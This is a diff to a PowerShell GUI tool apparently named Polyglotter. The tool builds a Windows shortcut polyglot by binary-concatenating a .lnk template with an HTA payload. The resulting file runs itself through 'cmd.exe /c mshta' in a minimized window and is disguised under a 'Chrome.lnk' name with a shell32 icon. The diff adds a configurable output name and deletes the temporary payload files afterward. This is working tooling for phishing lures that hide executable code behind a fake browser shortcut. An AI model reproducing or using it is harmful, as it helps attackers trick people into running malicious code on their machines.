@@ -1,4 +1,4 @@
-﻿#
+#
 #
 # Polyglotter v0.1b (C) 2024 - by suuhm
 # (C) 2024 by suuhm (https://github.com/suuhm)
@@ -37,6 +37,22 @@ function SelectHTAFile {
 #
 # Common script:
 #
+
+#
+# NAME OF THE OUTPUT LNK FILE:
+#
+if (-not $TextBoxChromeLink.Text) {
+    $__OUTPUT_LNK = "Chr0m3.lnk"
+} else {
+    $__OUTPUT_LNK = $TextBoxChromeLink.Text
+}
+
+#
+# Setup Iconset of shell32.dll with index icon 4
+#
+$__SHCULO_ICON = "%SystemRoot%\system32\SHELL32.dll,4"
+
+
 function StartScript {
     $desktopPath = [System.Environment]::GetFolderPath('Desktop')
 
@@ -71,19 +87,23 @@ Close
     $WshShell = New-Object -ComObject WScript.Shell
     $shortcut = $WshShell.CreateShortcut($shortcutPath)
     $shortcut.TargetPath = "cmd.exe"
-    $shortcut.Arguments = "/c mshta %CD%\Chrome.lnk"
+    $shortcut.Arguments = "/c mshta %CD%\$__OUTPUT_LNK"
     $shortcut.WorkingDirectory = "%CD%"
     $shortcut.WindowStyle = 7 # "Minimized"
-    $shortcut.IconLocation = "%SystemRoot%\system32\SHELL32.dll,4"
+    $shortcut.IconLocation = $__SHCULO_ICON
     $shortcut.Save()
 
     #$chromeLinkPath = Join-Path -Path $desktopPath -ChildPath "Chrome.lnk"
     #Copy-Item -Path $shortcutPath -Destination $chromeLinkPath
     #Copy-Item -Path $htaPath -Destination $chromeLinkPath -PassThru | Out-Null
     cd $desktopPath
-    cmd.exe /c copy /b %CD%\blueprint.lnk+$htaPath Chrome.lnk
+    cmd.exe /c copy /b %CD%\blueprint.lnk+$htaPath $__OUTPUT_LNK
 
-    Write-Host "Done."
+    Write-Host "Done. Create file on $desktopPath\$__OUTPUT_LNK and delete temp files"
+
+    # Garbage Delete files:
+    Remove-Item -Verbose $desktopPath\blueprint.lnk
+    Remove-Item -Verbose $desktopPath\payload.hta
 
 }
 
@@ -119,7 +139,6 @@ $LabelBanner2.Font = New-Object System.Drawing.Font("Arial",10,[System.Drawing.F
 $Form.Controls.Add($LabelBanner2)
 
 
-
 $LabelHTAPath = New-Object System.Windows.Forms.Label
 $LabelHTAPath.Location = New-Object System.Drawing.Point(20,70)
 $LabelHTAPath.Size = New-Object System.Drawing.Size(450,20)
@@ -145,6 +164,22 @@ $ButtonStartScript.Add_Click({
     StartScript
 })
 $Form.Controls.Add($ButtonStartScript)
+
+
+# Filename Label add
+$TextBoxChromeLink = New-Object System.Windows.Forms.TextBox
+$TextBoxChromeLink.Location = New-Object System.Drawing.Point(200, 160)
+$TextBoxChromeLink.Size = New-Object System.Drawing.Size(150, 20)
+$TextBoxChromeLink.Text = "Chrome.lnk"
+#$global:__OUTPUT_LNK=$TextBoxChromeLink.Text
+$Form.Controls.Add($TextBoxChromeLink)
+
+$LabelName = New-Object System.Windows.Forms.Label
+$LabelName.Location = New-Object System.Drawing.Point(200,185)
+$LabelName.Size = New-Object System.Drawing.Size(150,20)
+$LabelName.Text = "Name of Output *.lnk file"
+$Form.Controls.Add($LabelName)
+
 
 $ButtonExit = New-Object System.Windows.Forms.Button
 $ButtonExit.Location = New-Object System.Drawing.Point(20,160)
